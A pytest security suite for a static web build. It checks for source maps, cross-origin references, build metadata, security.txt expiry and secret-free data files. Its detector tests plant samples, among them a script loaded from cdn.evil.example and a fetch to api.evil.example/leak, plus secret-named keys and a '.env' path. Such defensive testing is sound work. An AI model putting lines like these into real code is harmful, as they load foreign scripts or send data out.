"""Security: what ships in web/out (task 7). Pure file inspection, no browser.

Brief exit criteria covered here: no source maps, no third-party requests (static part: no
subresource or stylesheet reference to another origin, every other-host string in a script is on a
reviewed list), out/build.json, RFC 9116 security.txt, humans.txt, licence file, and no secret-
named keys or secret-shaped values in the data files. The runtime "0 other-origin requests" check
is the smoke test's, in a real browser.
"""

from __future__ import annotations

import copy
import json
import re
import subprocess
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from quantum.risk import allowlist

from .helpers import DATA_DIR, FAKE_AWS_KEY_ID, REPO, load_data

# Other-host strings that appear INSIDE the shipped scripts, each reviewed 2026-11-08 against the
# surrounding code: none is fetched. A new host fails the test until someone reviews it.
INERT_HOSTS = {
    "www.w3.org": "XML namespace URI (svg xmlns), an identifier, never requested",
    "nextjs.org": "documentation link inside a framework error message string",
    "react.dev": "documentation link inside a framework error message string",
    "github.com": "core-js licence/source comment string inside a bundled polyfill",
    "scripts.sil.org": "the OFL licence text's own FAQ link (plain text in the licence file)",
}
HOST_RE = re.compile(r"https?://([A-Za-z0-9\-]+(?:\.[A-Za-z0-9\-]+)+)")
SCANNED = {".html", ".js", ".css", ".svg", ".json", ".txt", ".xml", ".webmanifest"}


def _files(out_dir: Path) -> list[Path]:
    return sorted(p for p in out_dir.rglob("*") if p.is_file())


def _text(p: Path) -> str:
    return p.read_text(encoding="utf-8", errors="ignore")


# ---------------------------------------------------------------------------- source maps


def test_security_no_source_maps_in_out(out_dir: Path) -> None:
    maps = [str(p.relative_to(out_dir)) for p in _files(out_dir) if p.suffix == ".map"]
    assert maps == []
    refs = [
        str(p.relative_to(out_dir))
        for p in _files(out_dir)
        if p.suffix in {".js", ".css"} and "sourceMappingURL" in _text(p)
    ]
    assert refs == []


# -------------------------------------------------------------------------- third parties


def _external_refs(html: str) -> list[str]:
    """Subresource-like references to another origin: src/srcset/poster/data/action, link href
    that is not an anchor, CSS url() and @import. Anchors are navigation."""
    refs: list[str] = []
    for tag in re.findall(r"<(?!a\b)[a-z][^>]*>", html, re.I):
        for attr in re.findall(
            r"""\b(?:src|srcset|poster|data|action|href)\s*=\s*["']?([^"'\s>]+)""", tag, re.I
        ):
            refs.append(attr)
    refs += re.findall(r"""url\(\s*["']?([^"')\s]+)""", html, re.I)
    refs += re.findall(r"""@import\s+(?:url\()?["']?([^"')\s;]+)""", html, re.I)
    return [r for r in refs if re.match(r"(?:https?:)?//", r)]


def test_security_no_page_or_stylesheet_references_another_origin(out_dir: Path) -> None:
    found: dict[str, list[str]] = {}
    for p in _files(out_dir):
        if p.suffix in {".html", ".css", ".svg"}:
            refs = _external_refs(_text(p))
            # an svg xmlns is an attribute value, not a reference: _external_refs ignores it
            if refs:
                found[str(p.relative_to(out_dir))] = refs
    assert found == {}


def test_security_every_other_host_string_in_the_bundle_is_reviewed(out_dir: Path) -> None:
    seen: dict[str, set[str]] = {}
    for p in _files(out_dir):
        if p.suffix in SCANNED:
            for host in HOST_RE.findall(_text(p)):
                seen.setdefault(host.lower(), set()).add(str(p.relative_to(out_dir)))
    unknown = {h: sorted(f)[:2] for h, f in seen.items() if h not in INERT_HOSTS}
    assert unknown == {}, "new host string in the bundle: review it, then list it with a reason"


def test_security_a_planted_third_party_reference_is_caught(out_dir: Path) -> None:
    assert _external_refs('<script src="https://cdn.evil.example/x.js"></script>')
    assert _external_refs('<link rel="stylesheet" href="//fonts.example/css">')
    assert _external_refs("<style>@import url(https://x.example/a.css)</style>")
    assert _external_refs('<style>a{background:url("http://x.example/i.png")}</style>')
    assert (
        _external_refs('<a href="https://github.com/x">repo</a>') == []
    )  # navigation is not a request
    assert _external_refs('<svg xmlns="http://www.w3.org/2000/svg"></svg>') == []
    assert HOST_RE.findall("fetch('https://api.evil.example/leak')") == ["api.evil.example"]


# ---------------------------------------------------------------------------- build.json


def test_security_build_json_is_exactly_the_commit(out_dir: Path) -> None:
    data = json.loads((out_dir / "build.json").read_text())
    assert set(data) == {"commit"}
    assert re.fullmatch(r"[0-9a-f]{40}", data["commit"]), data["commit"]
    # the commit must be a real commit of this repository, not a placeholder
    ok = subprocess.run(
        ["git", "cat-file", "-e", f"{data['commit']}^{{commit}}"], cwd=REPO, capture_output=True
    )
    assert ok.returncode == 0, "build.json names a commit that is not in this repository"


# ---------------------------------------------------------------- security.txt (RFC 9116)


def _security_txt(out_dir: Path) -> dict[str, list[str]]:
    p = out_dir / ".well-known" / "security.txt"
    assert p.is_file(), "RFC 9116 location is /.well-known/security.txt"
    fields: dict[str, list[str]] = {}
    for line in p.read_text(encoding="utf-8").splitlines():
        if line.strip() and not line.startswith("#") and ":" in line:
            k, v = line.split(":", 1)
            fields.setdefault(k.strip(), []).append(v.strip())
    return fields


def test_security_txt_has_contact_and_a_future_expiry_under_a_year(out_dir: Path) -> None:
    f = _security_txt(out_dir)
    assert f.get("Contact"), "Contact is required"
    assert all(re.match(r"(mailto:|https://|tel:)", c) for c in f["Contact"]), f["Contact"]
    assert len(f.get("Expires", [])) == 1, "exactly one Expires field"
    exp = datetime.fromisoformat(f["Expires"][0].replace("Z", "+00:00"))
    assert exp.tzinfo is not None
    now = datetime.now(UTC)
    assert now < exp <= now + timedelta(days=366), f"Expires {exp} must be future and < 1 year"


def test_security_txt_expiry_is_computed_at_build_not_typed(out_dir: Path) -> None:
    # brief: "Expires computed at build". The source must not hold a literal date.
    src = REPO / "web" / "scripts" / "postbuild.mjs"
    code = src.read_text(encoding="utf-8")
    assert not re.search(r"20\d\d-\d\d-\d\dT", code), (
        "a literal timestamp is typed in postbuild.mjs"
    )


def test_security_humans_txt_and_font_licence_ship(out_dir: Path) -> None:
    assert (out_dir / "humans.txt").read_text(encoding="utf-8").strip()
    lic = (out_dir / "licenses" / "IBM-Plex-OFL.txt").read_text(encoding="utf-8")
    assert "SIL OPEN FONT LICENSE" in lic.upper()


# -------------------------------------------------------------------------- the data files


NAMES = ["inventory", "lab", "scaling", "scenarios", "meta", "hero"]


@pytest.mark.parametrize("name", NAMES)
def test_security_data_file_passes_the_allow_list(name: str) -> None:
    assert allowlist.check(name, load_data(name)) == []


@pytest.mark.parametrize("name", NAMES)
def test_security_the_allow_list_catches_a_planted_key_path_and_crn(name: str) -> None:
    clean = load_data(name)

    def planted(mutate) -> list[str]:  # noqa: ANN001
        obj = copy.deepcopy(clean)
        mutate(obj)
        return allowlist.check(name, obj)

    assert planted(lambda o: o.update({"api_token": "x"}))  # a secret-named key
    assert planted(lambda o: o.update({"note": "/Users/someone/code/.env"}))  # a local path
    assert planted(lambda o: o.update({"note": "crn:v1:bluemix:public:quantum-computing"}))
    assert planted(lambda o: o.update({"note": FAKE_AWS_KEY_ID}))  # AWS-style key id
    assert planted(lambda o: o.update({"extra_unlisted_key": 1}))  # a key not on the allow-list
    assert allowlist.check(name, clean) == []  # and the mutations did not leak into the original


def test_security_no_data_file_is_over_5_mb() -> None:
    big = {
        p.name: p.stat().st_size for p in DATA_DIR.glob("*.json") if p.stat().st_size > 5_000_000
    }
    assert big == {}
